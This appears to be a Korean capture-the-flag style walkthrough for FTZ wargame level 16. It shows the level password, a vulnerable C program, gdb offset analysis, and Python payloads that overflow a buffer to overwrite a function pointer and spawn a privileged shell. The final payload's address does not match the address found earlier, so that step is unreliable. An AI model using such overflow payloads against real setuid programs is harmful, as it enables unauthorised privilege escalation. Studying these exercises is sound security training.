# FTZ Level16

#### ID : level16 PW: about to cause mass
<br>

**먼저 ```ls -l```을 이용해 어떤 파일이 있는지 살펴보자**<br> 
attackme 프로그램에 level17의 권한으로 setuid가 걸려있는 것을 확인할 수 있다.<br><br>
우선 hint의 내용을 보자<br>
```cat hint```<br>
```c
#include <stdio.h>

main()
{
      void shell(){
        setreuid(3097, 3097);
        system("/bin/sh");
      }
      void printit(){
        printf("Hello there!\n");
      }
      main(){
        int crap;
        void (*call)()=printit;
        char buf[20];
        fgets(buf, 48, stdin);
        call();
      }
}
```
내용을 보면 level17의 권한으로 쉘을 실행하는 shell 함수와 단순 출력하는 printit 함수가 있다.<br>
또 call 포인터에 printit 함수를 저장하고 main 마지막에 call 함수를 호출한다.<br>

목표 : printit을 가리키고 있는 call 주소 값을 shell 함수 주소로 변경해보자.

우리의 목적을 생각해보자.<br>
1. buf에서 *call까지 거리 구하기
2. shell 함수 주소 구하기
3. *call 위치에 shell 함수 주소 덮어 씌우기
3. 공격!

**attackme 코드를 디버깅해야하기 때문에 tmp폴더로 복사하자.**<br>
```cp attackme tmp```<br><br>
**그리고 디버깅을 해보자**<br>
```gdb -q attackme```<br>
```set disas intel```<br>
```disas main```<br>

<main+3>을 보면 0x38만큼의 공간을 만들고 있다. 0x38은 10진수로 56이다.<br>
buf에서 ebp까지의 거리가 56인 것이다.<br>
<main+36>을 보면 call에서 ebp까지의 거리가 16인 것을 알 수 있다.<br>
따라서 buf에서 call까지의 거리는 56-16인 40이다.<br>

이제 p 명령어로 shell 함수가 위치해 있는 주소를 확인해보자.<br>
```p shell```<br>
shell 함수의 주소는 0x80484d0으로 나온다.

그렇다면 우리가 작성할 페이로드는 다음과 같다고 할 수 있다.<br>
**"A"*(buf~call까지 거리)+(0x80484d0)**<br>

**이제 페이로드를 작성해보자.**<br>
```(python -c 'print "A"*40+"\xd0\x84\x04\x08"';cat)|./attackme```<br>
*(주소는 little endian 방식으로 입력된다)*<br>
<br>
```cd ..``` 다시 원래 디렉토리로 되돌아가서<br>
**공격 실시!**<br>
```(python -c 'print "A"*40+"\xb2\x84\x04\x08"';cat)|./attackme```<br>
```my-pass```로 비밀번호를 물어보면<br>
Level17 Password is "~~". 라고 나올 것이다!!
